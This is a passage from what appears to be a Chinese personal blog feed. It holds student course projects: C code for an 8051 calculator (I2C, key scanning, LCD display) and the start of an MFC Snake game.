class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div></pre></td><td class="code"><pre><div class="line">#include  &quot;I2C.H&quot;</div><div class="line">#include &lt;REG52.H&gt;</div><div class="line">#include &lt;intrins.h&gt;</div><div class="line"></div><div class="line">#define  NOP()   _nop_()   </div><div class="line">#define  _Nop()  _nop_()  </div><div class="line"></div><div class="line">sbit     SCL=P1^6;    </div><div class="line">sbit     SDA=P1^7;    </div><div class="line"></div><div class="line">bit ack;                 </div><div class="line"></div><div class="line">unsigned char I2C_temp[8]=&#123;&quot;01234567&quot;&#125;;                </div><div class="line"></div><div class="line">void Start_I2c()</div><div class="line">&#123;</div><div class="line">  	SDA=1;         </div><div class="line">  	_Nop();</div><div class="line">  	SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SDA=0;        </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=0;       </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line">void Stop_I2c()</div><div class="line">&#123;</div><div class="line">  	SDA=0;      </div><div class="line">  	_Nop();      </div><div class="line">  	SCL=1;      </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SDA=1;      </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line">void  SendByte(unsigned char  c)</div><div class="line">&#123;</div><div class="line"> 	unsigned char  BitCnt;</div><div class="line"> </div><div class="line"> 	for(BitCnt=0;BitCnt&lt;8;BitCnt++) </div><div class="line">    &#123;</div><div class="line">     	if((c&lt;&lt;BitCnt)&amp;0x80)SDA=1;   </div><div class="line">       		else  SDA=0;                </div><div class="line">     	_Nop();</div><div class="line">     	SCL=1;</div><div class="line">  		I2C_delay(10);   </div><div class="line">     	SCL=0; </div><div class="line">  		I2C_delay(10);   </div><div class="line">    &#125;</div><div class="line">  	I2C_delay(10);   </div><div class="line">    SDA=1;               </div><div class="line">  	I2C_delay(10);   </div><div class="line">    SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">    if(SDA==1)ack=0;     </div><div class="line">       else ack=1;       </div><div class="line">    SCL=0;</div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line">   </div><div class="line">unsigned char   RcvByte()</div><div class="line">&#123;</div><div class="line">  	unsigned char  retc;</div><div class="line">  	unsigned char  BitCnt;</div><div class="line">  </div><div class="line">  	retc=0; </div><div class="line">  	SDA=1;                     </div><div class="line">  	for(BitCnt=0;BitCnt&lt;8;BitCnt++)</div><div class="line">    &#123;</div><div class="line">  		I2C_delay(10);   </div><div class="line">        SCL=0;              </div><div class="line">	  	I2C_delay(10);   </div><div class="line">        SCL=1;                  </div><div class="line">  		I2C_delay(10);   </div><div class="line">        retc=retc&lt;&lt;1;</div><div class="line">        if(SDA==1)retc=retc+1; </div><div class="line">  		I2C_delay(10);   </div><div class="line">    &#125;</div><div class="line">  	SCL=0;    </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	return(retc);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Ack_I2c(bit a)</div><div class="line">&#123;</div><div class="line">  	if(a==0)SDA=0;        </div><div class="line">  		else SDA=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=0;                </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">bit IRcvStr(unsigned char  sla,unsigned char  suba,unsigned char  *s,unsigned char  no)</div><div class="line">&#123;</div><div class="line">   	unsigned char i;</div><div class="line"></div><div class="line">   	Start_I2c();                </div><div class="line">   	SendByte(sla);               </div><div class="line">   	if(ack==0)return(0);</div><div class="line">   	SendByte(suba);            </div><div class="line">   	if(ack==0)return(0);</div><div class="line"></div><div class="line">   	Start_I2c();                </div><div class="line">   	SendByte(sla+1);</div><div class="line">   	if(ack==0)return(0);</div><div class="line">   	for(i=0;i&lt;no-1;i++)</div><div class="line">   	&#123;   </div><div class="line">     	*s=RcvByte();             </div><div class="line">      	Ack_I2c(0);                 </div><div class="line">     	s++;</div><div class="line">   	&#125; </div><div class="line">   	*s=RcvByte();</div><div class="line">   	Ack_I2c(1);                   </div><div class="line">   	Stop_I2c();                    </div><div class="line">   	return(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void  I2C_Init(void)</div><div class="line">&#123;</div><div class="line">    SCL=1;</div><div class="line">    SDA=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void I2C_delay(unsigned char dly)</div><div class="line">&#123;</div><div class="line">	while(dly--);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="用户层"><a href="#用户层" class="headerlink" title="用户层"></a>用户层</h4><p>键值扫描的程序，使用hc165和zlg7290,读回键值并做一次转换。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line"></div><div class="line">extern unsigned char step;</div><div class="line">extern unsigned char state;</div><div class="line"></div><div class="line">int keyscan_transfer(unsigned char key) &#123;</div><div class="line">	int keyscan_transfer = 0;</div><div class="line">	switch(key) &#123;</div><div class="line">		case 0x01:keyscan_transfer = 7; break; </div><div class="line">		case 0x02:keyscan_transfer = 8; break; </div><div class="line">		case 0x03:keyscan_transfer = 9; break;</div><div class="line">		case 0x04:keyscan_transfer = 10; step = 1; break;</div><div class="line">		case 0x05:keyscan_transfer = 4;	break;</div><div class="line">		case 0x06:keyscan_transfer = 5; break;</div><div class="line">		case 0x07:keyscan_transfer = 6; break;</div><div class="line">		case 0x08:keyscan_transfer = 11; step = 1; break;</div><div class="line">		case 0x09:keyscan_transfer = 1; break;</div><div class="line">		case 0x0A:keyscan_transfer = 2; break; </div><div class="line">		case 0x0B:keyscan_transfer = 3; break;</div><div class="line">		case 0x0C:keyscan_transfer = 12; step = 1; break;</div><div class="line">		case 0x0D:keyscan_transfer = 0; break;</div><div class="line">		case 0x0E:keyscan_transfer = 15; state = 1; break;</div><div class="line">		case 0x0F:step = 3;keyscan_transfer = 14; break;</div><div class="line">		case 0x10:keyscan_transfer = 13; step = 1; break; </div><div class="line">	&#125;</div><div class="line">	return keyscan_transfer;	</div><div class="line">&#125;</div><div class="line"></div><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;keyscan_advance.h&gt;</div><div class="line">#include&lt;zlg7290.h&gt;</div><div class="line">extern int tempNumtransfer_1;</div><div class="line">extern int tempNumtransfer_2;</div><div class="line">extern int tempKeytransfer_1;</div><div class="line">extern int tempKeytransfer_2;</div><div class="line">extern unsigned char step;</div><div class="line">extern unsigned char result;</div><div class="line">extern int num_temp;</div><div class="line">void key_function(void) &#123;</div><div class="line">	unsigned char key_function;</div><div class="line">	key_function = hc165_re();</div><div class="line">	Delay1ms(100);</div><div class="line">	key_function = hc165_re();</div><div class="line">	switch(key_function)&#123;</div><div class="line">		case 0xfd: clear_step(); break; </div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void clear_step(void) &#123;</div><div class="line">	tempNumtransfer_1 = 0;</div><div class="line">	tempNumtransfer_2 = 0;</div><div class="line">	tempKeytransfer_1 = 0;</div><div class="line">  	tempKeytransfer_2 = 0;</div><div class="line">	step = 0;</div><div class="line">	disp_line(0);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">	LcdWrCmd(0x80);</div><div class="line">	key_press = 0;</div><div class="line">	num_temp = 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>计算器核心计算功能实现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">int num_temp = 0;</div><div class="line">int dec_temp = 0;</div><div class="line">unsigned char buf[12];</div><div class="line">extern unsigned char step;</div><div class="line">unsigned char LongToString(int dat)&#123;</div><div class="line">    signed char i = 0;</div><div class="line">    unsigned char len = 0;</div><div class="line">   </div><div class="line">    if (dat &lt; 0)&#123;</div><div class="line">        dat = -dat;</div><div class="line">        buf[0] = &apos;-&apos;;</div><div class="line">		i++;</div><div class="line">		len++;</div><div class="line">    &#125;</div><div class="line">   </div><div class="line">    do &#123;</div><div class="line">        buf[i] = dat % 10;</div><div class="line">		i++;</div><div class="line">        dat /= 10;</div><div class="line">    &#125; while (dat &gt; 0);</div><div class="line">    len += i; </div><div class="line">	return len;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int number_transfer(int key_transfer) &#123;</div><div class="line"></div><div class="line">	num_temp = num_temp*10 + key_transfer;</div><div class="line">	return num_temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int number_calculate(int num_1, int num_2,unsigned char key) &#123;</div><div class="line">	int result;</div><div class="line">	switch(key)&#123;</div><div class="line">		case 0x04: result = num_1 + num_2; break;</div><div class="line">		case 0x08: result = num_1 - num_2; break;</div><div class="line">		case 0x0C: result = num_1 * num_2; break;</div><div class="line">		case 0x10: result = num_1 / num_2; break;</div><div class="line">	&#125;</div><div class="line">	return result;	</div><div class="line">&#125;</div><div class="line"></div><div class="line">int decimal_transfer(int key_transfer) &#123;</div><div class="line"></div><div class="line">	dec_temp = dec_temp * 10 + key_transfer;	</div><div class="line">	return dec_temp;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>显示功能设计：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;calc.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;display.h&gt;</div><div class="line"></div><div class="line">unsigned char state = 0;</div><div class="line">extern unsigned char buf[12];</div><div class="line">unsigned char code ascii[]=&#123;&quot;0123456789&quot;&#125;;</div><div class="line">extern int temp;</div><div class="line">extern unsigned char step;</div><div class="line">int lcd_numdisplay(int num)&#123;</div><div class="line">	unsigned char arrayLength;</div><div class="line">	unsigned char i;</div><div class="line">	arrayLength = LongToString(num);</div><div class="line">	for(i = 0; i &lt; arrayLength; i++) &#123;</div><div class="line">		if(step == 0 || step == 2 || step == 3)</div><div class="line">			LcdWrData(ascii[buf[arrayLength-i-1]]); </div><div class="line">	&#125;</div><div class="line">	return arrayLength;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void lcd_flagdisplay(int num) &#123;</div><div class="line">	switch(num) &#123;</div><div class="line">		case 10: LcdWrData(&apos;+&apos;); break;</div><div class="line">		case 11: LcdWrData(&apos;-&apos;); break;</div><div class="line">		case 12: LcdWrData(&apos;*&apos;); break;</div><div class="line">		case 13: LcdWrData(&apos;/&apos;); break;</div><div class="line">	&#125;</div><div class="line">	step = 2;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void decimal_display(void) &#123;</div><div class="line">		LcdWrData(&apos;.&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>主函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;display.h&gt;</div><div class="line">#include&lt;calc.h&gt;</div><div class="line">#include&lt;I2C.h&gt;</div><div class="line">#include&lt;zlg7290.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line">#include&lt;keyscan_advance.h&gt;</div><div class="line">int tempKeytransfer_1 = 0;</div><div class="line">int tempNumtransfer_1 = 0;</div><div class="line">int tempKeytransfer_2 = 0;</div><div class="line">int tempNumtransfer_2 = 0;</div><div class="line">int tempKeytransfer_3 = 0;</div><div class="line">int tempNumtransfer_3 = 0;</div><div class="line">int tempKeytransfer_4 = 0;</div><div class="line">int tempNumtransfer_4 = 0;</div><div class="line">int resultTransfer;</div><div class="line">int result = 0;</div><div class="line">int decimal_result = 0;</div><div class="line">unsigned char decimalFlag_1 = 0;</div><div class="line">unsigned char decimalFlag_2 = 0;</div><div class="line">unsigned char step = 0;</div><div class="line">int temp_useless;</div><div class="line">int temp_decimal_useless;</div><div class="line">int temp;</div><div class="line">int temp_decimal;</div><div class="line">extern int num_temp;</div><div class="line">extern int dec_temp;</div><div class="line">extern unsigned char state;</div><div class="line">void main()&#123;</div><div class="line">	unsigned char tempKeycode;</div><div class="line">	hc165_init();</div><div class="line">	I2C_Init();</div><div class="line">	LcdInit();</div><div class="line">	while(1)&#123;</div><div class="line">		Read_ZLG7290Key();</div><div class="line">		delayMS(200);</div><div class="line">		key_function();</div><div class="line">		if(key_press == 1 &amp;&amp; step == 0 &amp;&amp; state == 0) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			tempKeytransfer_1 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x04 &amp;&amp; key_code != 0x08 &amp;&amp; key_code != 0x0C &amp;&amp; key_code != 0x10 &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_1 = number_transfer(tempKeytransfer_1);</div><div class="line">				disp_line(0);</div><div class="line">				temp = lcd_numdisplay(tempNumtransfer_1);</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 0 &amp;&amp; state == 1)&#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp);</div><div class="line">			decimal_display();</div><div class="line">			tempKeytransfer_3 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x04 &amp;&amp; key_code != 0x08 &amp;&amp; key_code != 0x0C &amp;&amp; key_code != 0x10 &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_3 = decimal_transfer(tempKeytransfer_3);</div><div class="line">				temp_decimal = lcd_numdisplay(tempNumtransfer_3) + 1;	</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal);</div><div class="line">			decimalFlag_1 = 1;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 1) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			tempKeycode = key_code;</div><div class="line">			lcd_flagdisplay(keyscan_transfer(key_code));</div><div class="line">			num_temp = 0;</div><div class="line">			dec_temp = 0;</div><div class="line">			state = 0;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 2 &amp;&amp; state == 0) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+1);</div><div class="line">			tempKeytransfer_2 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x0F &amp;&amp; key_code != 0x0E)&#123;</div><div class="line">				tempNumtransfer_2 = number_transfer(tempKeytransfer_2);</div><div class="line">				temp_useless = lcd_numdisplay(tempNumtransfer_2);</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+temp_useless+1);</div><div class="line">			decimalFlag_2 = 1;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 2 &amp;&amp; state == 1)&#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+temp_useless+1);</div><div class="line">			decimal_display();</div><div class="line">			tempKeytransfer_4 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x0F &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_4 = decimal_transfer(tempKeytransfer_4);</div><div class="line">				temp_decimal_useless = lcd_numdisplay(tempNumtransfer_4);	</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(step == 3)&#123;	</div><div class="line">			if(decimalFlag_1 * decimalFlag_2 == 0) &#123;</div><div class="line">				result = number_calculate(tempNumtransfer_1,tempNumtransfer_2,tempKeycode);</div><div class="line">				disp_line(1);</div><div class="line">				temp_useless = lcd_numdisplay(result);	</div><div class="line">		 	&#125;</div><div class="line">			if(decimalFlag_1 * decimalFlag_2 == 1) &#123;</div><div class="line">				result = number_calculate(tempNumtransfer_1,tempNumtransfer_2,tempKeycode);</div><div class="line">				decimal_result = number_calculate(tempNumtransfer_3,tempNumtransfer_4,tempKeycode);</div><div class="line">				disp_line(1);</div><div class="line">				if(decimal_result &gt; 9) &#123;</div><div class="line">					temp = lcd_numdisplay(result+1);</div><div class="line">					LcdWrCmd(0x80+0x40+temp);</div><div class="line">					decimal_display();</div><div class="line">					LcdWrCmd(0x80+0x40+temp+1);</div><div class="line">					temp_useless = lcd_numdisplay(decimal_result%10);</div><div class="line">				&#125;</div><div class="line">				else &#123;</div><div class="line">					temp = lcd_numdisplay(result);</div><div class="line">					LcdWrCmd(0x80+0x40+temp);</div><div class="line">					decimal_display();</div><div class="line">					LcdWrCmd(0x80+0x40+temp+1);</div><div class="line">					temp_useless = lcd_numdisplay(decimal_result);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>具体实现的思路大概就是前文讲的那样，可是程序结构的设计相当欠考虑，有很多做的不到位的地方，看起来很傻，耗费的时间太多。就这样。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;电子系统设计实验课–计算器&quot;&gt;&lt;a href=&quot;#电子系统设计实验课–计算器&quot; class=&quot;headerlink&quot; title=&quot;电子系统设计实验课–计算器&quot;&gt;&lt;/a&gt;电子系统设计实验课–计算器&lt;/h2&gt;&lt;p&gt;这篇文章是我电子系统设计课的第一次大作业报告。老师要求从六个题目当中选一个做项目，我选择的是看起来最复杂的一个。因为其他的项目貌似只要修改我之前的万能电子钟的代码就好，简易计算器这个项目算是从零开始啦。&lt;br&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="C" scheme="https://hsmouc.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>基于MFC框架的贪吃蛇程序</title>
    <link href="https://hsmouc.com/2016/04/13/2016-04-13-mfc/"/>
    <id>https://hsmouc.com/2016/04/13/2016-04-13-mfc/</id>
    <published>2016-04-13T07:34:43.000Z</published>
    <updated>2016-10-22T15:40:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>使用MFC的文本视图框架来写，实现贪吃蛇的基本功能：食物随机出现，键盘操作，蛇吃食物变长，蛇撞到边界和自己游戏结束，添加蛇身速度选择的按钮控件。<br> <a id="more"></a> </p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>SnakeDoc.h和SnakeDoc.cpp中的变量声明与初始化如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">class CSnakeDoc : public CDocument</div><div class="line">&#123;</div><div class="line">protected: // create from serialization only</div><div class="line">	CSnakeDoc();</div><div class="line">	DECLARE_DYNCREATE(CSnakeDoc)</div><div class="line"></div><div class="line">// Attributes</div><div class="line">public:</div><div class="line">	struct&#123;</div><div class="line">	int body_x;</div><div class="line">	int body_y;</div><div class="line">	int direction;</div><div class="line">	int length;</div><div class="line">	&#125;snake[100];</div><div class="line"></div><div class="line">	struct&#123;</div><div class="line">	int food_x;</div><div class="line">	int food_y;</div><div class="line">	bool isfood;</div><div class="line">	&#125;food;</div><div class="line"></div><div class="line">	bool startFlag;</div><div class="line">	... //省略</div><div class="line">&#125;</div><div class="line">// Operations</div><div class="line">BOOL CSnakeDoc::OnNewDocument()</div><div class="line">&#123;</div><div class="line">	if (!CDocument::OnNewDocument())</div><div class="line">		return FALSE;</div><div class="line">	snake[0].body_x = 10;</div><div class="line">	snake[0].body_y = 10;</div><div class="line">	snake[1].body_x = 11;</div><div class="line">	snake[1].body_y = 10;</div><div class="line">	snake[2].body_x = 12;</div><div class="line">	snake[2].body_y = 10;</div><div class="line">	snake[0].direction = 3;</div><div class="line">	snake[0].length = 3;</div><div class="line">	food.isfood = true;</div><div class="line">	startFlag = false;</div><div class="line"></div><div class="line">	// TODO: add reinitialization code here</div><div class="line">	// (SDI documents will reuse this document)</div><div class="line"></div><div class="line">	return TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>蛇和食物用两个结构体来表示，snake[]结构体中包含了蛇的坐标和蛇身的长度(蛇是用方块组成，简单来说length表示构成蛇的方块数)。food结构体中包含了食物的坐标和食物是否出现的状态。   </p>
<p>视图类中的代码是这样的:  </p>
<pre><code class="c++"><span class="keyword">void</span> CSnakeView::OnDraw(CDC* pDC)
{
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    pDC-&gt;TextOut(<span class="number">20</span>,<span class="number">20</span>,<span class="string">"Hsmouc"</span>);
    pDC-&gt;TextOut(<span class="number">20</span>,<span class="number">50</span>,<span class="string">"Ocean University of China"</span>);
    CBrush DrawBrush=(RGB(<span class="number">130</span>,<span class="number">130</span>,<span class="number">0</span>));
    CBrush *Drawbrush=pDC-&gt;SelectObject(&amp;DrawBrush);
    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; i++){
        pDC-&gt;Rectangle(pDoc-&gt;snake[i].body_x*<span class="number">20</span>,pDoc-&gt;snake[i].body_y*<span class="number">20</span>,(pDoc-&gt;snake[i].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[i].body_y+<span class="number">1</span>)*<span class="number">20</span>);

    }
    pDC-&gt;SelectObject(DrawBrush);
    <span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>
}
<span class="keyword">void</span> CSnakeView::OnKeyDown(UINT nChar, UINT nRepCnt, UINT nFlags) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">switch</span>(nChar){
        <span class="keyword">case</span> VK_UP:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">2</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">1</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_DOWN:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">1</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">2</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_LEFT:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">4</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">3</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_RIGHT:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">3</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">4</span>;
            }
            <span class="keyword">break</span>;
    }
    CView::OnKeyDown(nChar, nRepCnt, nFlags);
}

<span class="keyword">void</span> CSnakeView::OnTimer(UINT nIDEvent) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>
    CDC *pDC = GetDC();
    CSnakeDoc* pDoc = GetDocument();
